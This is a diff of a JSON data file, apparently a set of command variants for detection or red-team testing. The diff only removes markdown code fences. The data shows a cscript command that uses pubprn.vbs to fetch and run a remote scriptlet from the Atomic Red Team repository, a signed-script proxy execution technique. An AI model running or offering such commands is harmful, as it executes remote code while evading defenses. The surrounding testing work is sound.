@@ -1,4 +1,3 @@
-```json
 [
   {
     "output": "cscript.exe //b C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs localhost \"script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216.001/src/T1216.001.sct\"",
@@ -17,4 +16,3 @@
     "explanation": "The command adds quotes around the 'localhost' argument for clarity and consistency, which is still parsed correctly by the script."
   }
 ]
-```
